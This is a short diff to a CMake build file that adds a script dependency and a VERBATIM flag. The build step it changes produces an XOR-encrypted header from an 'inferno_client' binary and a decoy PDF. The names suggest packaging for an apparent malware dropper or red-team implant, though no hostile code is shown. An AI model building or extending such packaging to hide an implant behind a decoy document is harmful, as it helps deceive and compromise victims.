@@ -23,7 +23,9 @@ add_custom_command(
             "${AGENT_BINARY_HEADER}"
     DEPENDS  inferno_client
              "${DECOY_PDF}"
+             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
     COMMENT "Generating agent_binary.h (XOR-encrypted) from inferno_client + decoy PDF"
+    VERBATIM
 )
 
 set(WRAPPER_SOURCES
